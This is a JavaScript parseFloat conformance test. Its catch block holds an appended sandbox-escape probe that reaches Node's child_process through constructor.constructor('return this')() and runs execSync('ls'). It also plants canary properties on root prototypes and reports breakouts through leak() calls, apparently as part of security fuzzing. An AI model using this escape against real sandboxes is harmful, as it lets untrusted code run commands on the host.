try {
    var errorCount = 0;
    var count = 0;
    var indexP;
    var indexO = 0;
    for (var index = 0; index <= 65535; index++) {
        if (index < 48 || index > 57) {
            var hex = decimalToHexString(index);
            if (parseFloat('0.1e1' + String.fromCharCode(index)) !== 1) {
                if (indexO === 0) {
                    indexO = index;
                } else {
                    if (index - indexP !== 1) {
                        if (indexP - indexO !== 0) {
                            var hexP = decimalToHexString(indexP);
                            var hexO = decimalToHexString(indexO);
                            $ERROR('#' + hexO + '-' + hexP + ' ');
                        } else {
                            var hexP = decimalToHexString(indexP);
                            $ERROR('#' + hexP + ' ');
                        }
                        indexO = index;
                    }
                }
                indexP = index;
                errorCount++;
            }
            count++;
        }
    }
    if (errorCount > 0) {
        if (indexP - indexO !== 0) {
            var hexP = decimalToHexString(indexP);
            var hexO = decimalToHexString(indexO);
            $ERROR('#' + hexO + '-' + hexP + ' ');
        } else {
            var hexP = decimalToHexString(indexP);
            $ERROR('#' + hexP + ' ');
        }
        $ERROR('Total error: ' + errorCount + ' bad Unicode character in ' + count + ' ');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}